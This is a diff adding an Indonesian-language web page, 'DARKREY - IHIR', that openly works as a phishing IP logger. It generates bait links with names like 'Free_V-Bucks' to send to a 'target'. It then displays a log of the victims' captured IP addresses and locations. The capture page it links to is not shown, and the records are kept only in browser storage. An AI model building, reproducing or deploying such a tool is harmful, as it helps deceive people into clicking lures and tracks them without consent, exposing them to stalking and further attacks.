@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>DARKREY - IHIR</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; font-family: 'Courier New', monospace; color: #0f0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative; overflow-x: hidden; }
+        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.2; pointer-events: none; }
+        .refresh-indicator { position: fixed; top: -50px; left: 0; width: 100%; height: 50px; background: rgba(255,0,0,0.9); color: #fff; display: flex; justify-content: center; align-items: center; font-size: 14px; transition: top 0.3s; z-index: 9999; }
+        .card { position: relative; z-index: 10; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 1px solid #f00; border-radius: 24px; padding: 30px; max-width: 550px; width: 100%; box-shadow: 0 0 30px rgba(255,0,0,0.2); }
+        h1 { color: #f00; text-align: center; font-size: 1.8rem; margin-bottom: 8px; }
+        .sub { text-align: center; color: #888; font-size: 0.75rem; margin-bottom: 25px; border-bottom: 1px solid #f00; display: inline-block; width: auto; padding-bottom: 5px; }
+        .info-box { background: #0a0a0a; border: 1px solid #f00; border-radius: 12px; padding: 10px; margin-bottom: 20px; text-align: center; font-size: 12px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #f00; font-size: 0.8rem; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #f00; color: #0f0; border-radius: 12px; font-family: monospace; font-size: 14px; }
+        button { width: 100%; padding: 12px; background: #000; border: 1px solid #f00; color: #f00; border-radius: 12px; font-family: monospace; font-weight: bold; cursor: pointer; transition: all 0.2s; margin-bottom: 20px; }
+        button:hover { background: #f00; color: #000; transform: scale(1.02); }
+        .link-box { background: #0a0a0a; border: 1px solid #f00; border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: center; word-break: break-all; }
+        .link-box a { color: #0f0; text-decoration: none; }
+        .copy-btn { background: #000; border: 1px solid #f00; color: #f00; padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 12px; margin-top: 8px; display: inline-block; }
+        .log-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .log { background: #000; border: 1px solid #f00; border-radius: 12px; height: 200px; overflow-y: auto; padding: 12px; font-size: 11px; font-family: monospace; }
+        .log-entry { border-left: 2px solid #f00; padding-left: 10px; margin: 6px 0; word-break: break-all; }
+        .back-btn { display: inline-block; background: #333; color: #f00; border: 1px solid #f00; padding: 8px 16px; border-radius: 8px; cursor: pointer; margin-bottom: 20px; font-family: monospace; width: auto; }
+        @media (max-width: 480px) { .card { padding: 20px; } h1 { font-size: 1.4rem; } }
+    </style>
+</head>
+<body>
+<canvas id="matrixCanvas"></canvas>
+<div id="refreshIndicator" class="refresh-indicator">↓ Tarik ke bawah untuk refresh</div>
+<div class="card">
+    <button class="back-btn" onclick="window.location.href='index.html'">← BACK</button>
+    <div style="text-align: center;"><h1>🔥 DARKREY 🔥</h1><div class="sub">🎣 IHIR</div></div>
+    <div class="info-box">📌 Buat link ihir untuk mendapatkan IP target.<br>🔗 Kirim link ke target, saat diklik IP-nya akan tercatat.</div>
+    <div class="input-group"><label>📝 NAMA LINK (optional)</label><input type="text" id="linkName" placeholder="Contoh: Free_V-Bucks" value="Free_Gift"></div>
+    <button onclick="generatePhishLink()">🔗 GENERATE LINK</button>
+    <div id="linkResult" class="link-box" style="display: none;"><div style="color:#f00; margin-bottom:5px;">🔗 LINK IHIR:</div><a id="phishLink" href="#" target="_blank"></a><div><button class="copy-btn" onclick="copyPhishLink()">📋 COPY LINK</button></div></div>
+    <div class="input-group"><div class="log-header"><label>👁️ DATA YANG TERKUMPUL</label><button class="copy-btn" onclick="refreshData()" style="margin-left: 10px;">🔄 REFRESH</button></div><div id="dataLog" class="log">[READY] Belum ada data. Generate link dulu.</div></div>
+</div>
+<script>
+    const canvas = document.getElementById('matrixCanvas'); const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars = "01アイウエオカキクケコサシスセソタチツテト0123456789"; const fontSize = 14; const columns = canvas.width / fontSize; const drops = [];
+    for(let i=0;i<columns;i++) drops[i]=1;
+    function drawMatrix() { ctx.fillStyle='rgba(0,0,0,0.04)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle='#0f0'; ctx.font=fontSize+'px monospace'; for(let i=0;i<drops.length;i++){ const text=chars[Math.floor(Math.random()*chars.length)]; ctx.fillText(text,i*fontSize,drops[i]*fontSize); if(drops[i]*fontSize>canvas.height && Math.random()>0.975) drops[i]=0; drops[i]++; } }
+    setInterval(drawMatrix,50); window.addEventListener('resize',()=>{ canvas.width=window.innerWidth; canvas.height=window.innerHeight; });
+    let touchStartY=0, refreshIndicator=document.getElementById('refreshIndicator');
+    document.addEventListener('touchstart',e=>{ touchStartY=e.touches[0].clientY; });
+    document.addEventListener('touchmove',e=>{ if((window.scrollY||document.documentElement.scrollTop)===0 && e.touches[0].clientY>touchStartY+50) refreshIndicator.style.top='0px'; });
+    document.addEventListener('touchend',()=>{ if(refreshIndicator.style.top==='0px'){ refreshIndicator.style.top='-50px'; location.reload(); } });
+    if(localStorage.getItem('darkray_logged')!=='true') window.location.href='login.html';
+    let phishData = JSON.parse(localStorage.getItem('darkrey_phish_data') || '[]');
+    function savePhishData(){ localStorage.setItem('darkrey_phish_data', JSON.stringify(phishData)); }
+    function refreshData(){ phishData = JSON.parse(localStorage.getItem('darkrey_phish_data') || '[]'); updateDataLog(); addToDataLog('system', '📊 Data berhasil di-refresh'); }
+    function updateDataLog(){ const logDiv=document.getElementById('dataLog'); if(!logDiv) return; if(phishData.length===0){ logDiv.innerHTML='<div class="log-entry">[READY] Belum ada data yang terkumpul. Generate link dulu.</div>'; return; } logDiv.innerHTML=''; phishData.forEach((item)=>{ const div=document.createElement('div'); div.className='log-entry'; const time=new Date(item.timestamp).toLocaleString('id-ID'); div.innerHTML=`[${time}] 🎯 ${item.ip} | 📍 ${item.location || 'Tidak diketahui'} | 🔗 ${item.linkName || 'Tanpa nama'}`; logDiv.appendChild(div); }); logDiv.scrollTop=logDiv.scrollHeight; }
+    function generatePhishLink(){ const linkName=document.getElementById('linkName').value.trim()||'Free_Gift'; let baseUrl=window.location.href.split('?')[0]; baseUrl=baseUrl.substring(0,baseUrl.lastIndexOf('/')+1); const targetPageUrl=baseUrl+'go.html'; const targetUrl=`${targetPageUrl}?id=${btoa(linkName)}`; document.getElementById('linkResult').style.display='block'; const link=document.getElementById('phishLink'); link.href=targetUrl; link.innerText=targetUrl; addToDataLog('system',`🔗 Link ihir dibuat: ${linkName} -> ${targetUrl}`); }
+    function copyPhishLink(){ const link=document.getElementById('phishLink').href; navigator.clipboard.writeText(link); addToDataLog('system','📋 Link berhasil di-copy ke clipboard'); }
+    function addToDataLog(type,msg){ const logDiv=document.getElementById('dataLog'); if(!logDiv) return; const div=document.createElement('div'); div.className='log-entry'; const time=new Date().toLocaleTimeString('id-ID',{hour12:false}); div.innerHTML=`[${time}] ${msg}`; div.style.color=type==='system'?'#88ff88':'#ff8888'; logDiv.appendChild(div); div.scrollIntoView(); if(logDiv.children.length>100) logDiv.removeChild(logDiv.children[0]); }
+    window.recordPhish = function(ip, location, linkName){ phishData.unshift({ ip: ip, location: location, linkName: linkName, timestamp: Date.now() }); savePhishData(); updateDataLog(); };
+    updateDataLog();
+</script>
+</body>
+</html>
